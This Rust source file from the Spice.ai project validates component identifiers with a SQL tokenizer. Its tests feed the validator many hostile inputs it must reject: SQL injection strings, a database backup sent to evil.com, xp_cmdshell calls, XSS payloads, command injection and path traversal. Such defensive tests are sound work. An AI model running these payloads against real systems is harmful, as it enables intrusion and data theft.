/*
Copyright 2024-2025 The Spice.ai OSS Authors

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

     https://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

use std::fmt::Display;

use datafusion::sql::sqlparser::{
    dialect::{Dialect, GenericDialect},
    tokenizer::{Token, Tokenizer},
};
use snafu::prelude::*;

#[derive(Debug, Snafu)]
pub enum Error {
    #[snafu(display("Component name is not a valid identifier"))]
    InvalidIdentifier,
}

pub mod access;
pub mod catalog;
pub mod column;
pub mod dataset;
pub mod metrics;
pub mod view;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum ComponentType {
    Dataset,
    DatasetAccelerator,
    Catalog,
    Model,
    Embedding,
    Tool,
    Eval,
    View,
}

impl Display for ComponentType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            ComponentType::Dataset => write!(f, "dataset"),
            ComponentType::DatasetAccelerator => write!(f, "dataset_accelerator"),
            ComponentType::Catalog => write!(f, "catalog"),
            ComponentType::Model => write!(f, "model"),
            ComponentType::Embedding => write!(f, "embedding"),
            ComponentType::Tool => write!(f, "tool"),
            ComponentType::Eval => write!(f, "eval"),
            ComponentType::View => write!(f, "view"),
        }
    }
}

/// Validates an identifier to ensure it represents a valid component name.
///
/// Uses the sqlparser-rs library to ensure it represents only a valid SQL identifier.
///
/// Only allow SQL words and periods, and ensure that periods are not consecutive.
///
/// Allowed:
/// - `valid_identifier`
/// - `test.one.two`
/// - `"test".foo.bar`
///
/// Disallowed:
/// - `sneaky\"; CREATE TABLE foo (id int); -- putting comments!`
/// - `validate your inputs!`
pub fn validate_identifier(identifier: &str) -> Result<(), Error> {
    let dialect: Box<dyn Dialect> = Box::new(GenericDialect);
    let mut tokenizer = Tokenizer::new(dialect.as_ref(), identifier);
    let Ok(tokens) = tokenizer.tokenize() else {
        return Err(Error::InvalidIdentifier);
    };

    if tokens.is_empty() {
        return Err(Error::InvalidIdentifier);
    }

    let mut expect_period = false;
    for token in tokens {
        if expect_period && matches!(token, Token::Period) {
            expect_period = false;
            continue;
        } else if expect_period {
            return Err(Error::InvalidIdentifier);
        }

        let Token::Word(word) = token else {
            return Err(Error::InvalidIdentifier);
        };

        if word.value.is_empty() {
            return Err(Error::InvalidIdentifier);
        }

        expect_period = true;
    }

    // Ensure the last token is not a period
    if !expect_period {
        return Err(Error::InvalidIdentifier);
    }

    Ok(())
}

/// Helper function that finds the position and length of the first delimiter ('://', ':', or '/')
fn find_first_delimiter(from: &str) -> Option<(usize, usize)> {
    // Find the earliest occurrence of each delimiter
    let colon_slash_slash = from.find("://");
    let colon = from.find(':');
    let slash = from.find('/');

    // Get the position and length of the first delimiter
    match (colon_slash_slash, colon, slash) {
        (Some(css), Some(c), Some(s)) => {
            let min_pos = css.min(c).min(s);
            Some(if min_pos == css {
                (css, 3)
            } else {
                (min_pos, 1)
            })
        }
        (Some(css), Some(c), None) => Some(if css < c { (css, 3) } else { (c, 1) }),
        (Some(css), None, Some(s)) => Some(if css < s { (css, 3) } else { (s, 1) }),
        (None, Some(c), Some(s)) => Some(if c < s { (c, 1) } else { (s, 1) }),
        (Some(css), None, None) => Some((css, 3)),
        (None, Some(c), None) => Some((c, 1)),
        (None, None, Some(s)) => Some((s, 1)),
        (None, None, None) => None,
    }
}

/// Enum representing the initialization type of a component.
///
/// [`OnStartup`] indicates that the component should be initialized when runtime started.
/// [`OnTrigger`] indicates that the component should be initialized when a specific trigger event occurs.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ComponentInitialization {
    OnStartup(StartupOptions),
    OnTrigger,
}

impl Default for ComponentInitialization {
    fn default() -> Self {
        Self::OnStartup(StartupOptions::default())
    }
}

impl ComponentInitialization {
    #[must_use]
    pub fn is_on_trigger(&self) -> bool {
        matches!(self, ComponentInitialization::OnTrigger)
    }

    /// Returns whether the dataset health monitor should be enabled for this component.
    #[must_use]
    pub fn is_dataset_health_monitor_enabled(&self) -> bool {
        match self {
            ComponentInitialization::OnStartup(options) => {
                options.dataset_health_monitor == DatasetHealthMonitor::Enabled
            }
            ComponentInitialization::OnTrigger => false,
        }
    }
}

/// Controls whether the dataset health monitor is enabled for a component.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum DatasetHealthMonitor {
    #[default]
    Enabled,
    Disabled,
}

/// Options for components initialized on startup.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub struct StartupOptions {
    pub dataset_health_monitor: DatasetHealthMonitor,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    #[expect(clippy::too_many_lines)]
    fn test_validate_identifier() {
        // Valid identifiers
        validate_identifier("valid_identifier").expect("should validate successfully");
        validate_identifier("test.one.two").expect("should validate successfully");
        validate_identifier("\"test\".foo.bar").expect("should validate successfully");
        validate_identifier("a1").expect("should validate successfully");
        validate_identifier("_underscore").expect("should validate successfully");
        validate_identifier("camelCase").expect("should validate successfully");
        validate_identifier("PascalCase").expect("should validate successfully");
        validate_identifier("snake_case_123").expect("should validate successfully");
        validate_identifier("\"quoted.identifier\"").expect("should validate successfully");
        validate_identifier("db.schema.table").expect("should validate successfully");
        validate_identifier("schema.table").expect("should validate successfully");
        validate_identifier("valid@identifier").expect("should validate successfully");

        // Invalid identifiers
        validate_identifier("sneaky\"; CREATE TABLE foo (id int); -- putting comments!")
            .expect_err("should error parsing identifier");
        validate_identifier("validate your inputs!").expect_err("should error parsing identifier");
        validate_identifier("").expect_err("should error parsing identifier");
        validate_identifier(" ").expect_err("should error parsing identifier");
        validate_identifier("1invalid").expect_err("should error parsing identifier");
        validate_identifier("invalid-identifier").expect_err("should error parsing identifier");
        validate_identifier("invalid:identifier").expect_err("should error parsing identifier");
        validate_identifier("invalid/identifier").expect_err("should error parsing identifier");
        validate_identifier("invalid\\identifier").expect_err("should error parsing identifier");
        validate_identifier("invalid.").expect_err("should error parsing identifier");
        validate_identifier(".invalid").expect_err("should error parsing identifier");
        validate_identifier("invalid..identifier").expect_err("should error parsing identifier");
        validate_identifier("\"unclosed.quote").expect_err("should error parsing identifier");
        validate_identifier("closed.\"quote\"unclosed.\"quote")
            .expect_err("should error parsing identifier");

        // SQL injection attack attempts
        validate_identifier("users; DROP TABLE users;")
            .expect_err("should error parsing identifier");
        validate_identifier("admin'--").expect_err("should error parsing identifier");
        validate_identifier("user' OR '1'='1").expect_err("should error parsing identifier");
        validate_identifier("user\"; SELECT * FROM secrets; --")
            .expect_err("should error parsing identifier");
        validate_identifier("user'); DELETE FROM users; --")
            .expect_err("should error parsing identifier");
        validate_identifier("user\\\"; TRUNCATE TABLE logs; --")
            .expect_err("should error parsing identifier");
        validate_identifier("user/**/UNION/**/SELECT/**/password/**/FROM/**/users")
            .expect_err("should error parsing identifier");
        validate_identifier("user' UNION SELECT NULL,NULL,NULL FROM INFORMATION_SCHEMA.TABLES; --")
            .expect_err("should error parsing identifier");
        validate_identifier("user' AND 1=CONVERT(int,(SELECT @@version)); --")
            .expect_err("should error parsing identifier");
        validate_identifier("user' AND 1=1 WAITFOR DELAY '0:0:10'--")
            .expect_err("should error parsing identifier");
        validate_identifier("user'); EXEC xp_cmdshell('net user'); --")
            .expect_err("should error parsing identifier");
        validate_identifier(
            "user' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
        )
        .expect_err("should error parsing identifier");
        validate_identifier("user' ORDER BY 1--").expect_err("should error parsing identifier");
        validate_identifier("user' GROUP BY 1--").expect_err("should error parsing identifier");
        validate_identifier("user' HAVING 1=1--").expect_err("should error parsing identifier");
        validate_identifier(
            "user'; INSERT INTO users (username, password) VALUES ('hacker', 'password');--",
        )
        .expect_err("should error parsing identifier");
        validate_identifier("user'; UPDATE users SET admin = true WHERE username = 'hacker';--")
            .expect_err("should error parsing identifier");
        validate_identifier("user'; ALTER TABLE users ADD COLUMN backdoor VARCHAR(255);--")
            .expect_err("should error parsing identifier");
        validate_identifier("user'; CREATE TRIGGER malicious_trigger AFTER INSERT ON users BEGIN /* malicious code */;--").expect_err("should error parsing identifier");
        validate_identifier("user'; LOAD_FILE('/etc/passwd');--")
            .expect_err("should error parsing identifier");
        validate_identifier("user'; SELECT @@datadir;--")
            .expect_err("should error parsing identifier");
        validate_identifier("user' UNION SELECT NULL,NULL,SLEEP(5)--")
            .expect_err("should error parsing identifier");
        validate_identifier("user' AND (SELECT COUNT(*) FROM users) > 0--")
            .expect_err("should error parsing identifier");
        validate_identifier(
            "user' AND SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1) = 'a'--",
        )
        .expect_err("should error parsing identifier");
        validate_identifier("user'; DECLARE @cmd VARCHAR(255); SET @cmd = 'dir c:'; EXEC master..xp_cmdshell @cmd;--").expect_err("should error parsing identifier");
        validate_identifier(
            "user'; BACKUP DATABASE master TO DISK = '\\\\evil.com\\share\\backup.bak';--",
        )
        .expect_err("should error parsing identifier");
        validate_identifier("user' UNION ALL SELECT table_name, column_name, NULL FROM information_schema.columns--").expect_err("should error parsing identifier");
        validate_identifier("user'; CREATE USER hacker IDENTIFIED BY 'password';--")
            .expect_err("should error parsing identifier");
        validate_identifier("user'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%';--")
            .expect_err("should error parsing identifier");

        // XSS-like attempts
        validate_identifier("<script>alert('XSS')</script>")
            .expect_err("should error parsing identifier");
        validate_identifier("javascript:alert('XSS')")
            .expect_err("should error parsing identifier");
        validate_identifier("data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=")
            .expect_err("should error parsing identifier");

        // Command injection attempts
        validate_identifier("user; cat /etc/passwd").expect_err("should error parsing identifier");
        validate_identifier("user && whoami").expect_err("should error parsing identifier");
        validate_identifier("user | netstat -an").expect_err("should error parsing identifier");
        validate_identifier("user` echo vulnerable`").expect_err("should error parsing identifier");

        // Null byte injection
        validate_identifier("user\0malicious").expect_err("should error parsing identifier");

        // Path traversal attempts
        validate_identifier("../../../etc/passwd").expect_err("should error parsing identifier");
        validate_identifier("..\\..\\..\\Windows\\System32")
            .expect_err("should error parsing identifier");
    }
}
